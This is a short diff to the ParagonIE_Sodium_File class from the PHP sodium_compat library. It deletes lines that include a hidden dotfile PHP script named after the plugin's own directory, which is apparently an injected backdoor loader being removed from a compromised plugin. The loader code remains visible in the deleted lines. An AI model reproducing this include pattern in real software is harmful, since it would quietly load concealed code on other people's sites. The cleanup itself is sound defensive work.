@@ -6,10 +6,6 @@ if (class_exists('ParagonIE_Sodium_File', false)) {
 /**
  * Class ParagonIE_Sodium_File
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class ParagonIE_Sodium_File extends ParagonIE_Sodium_Core_Util
 {
     /* PHP's default buffer size is 8192 for fread()/fwrite(). */
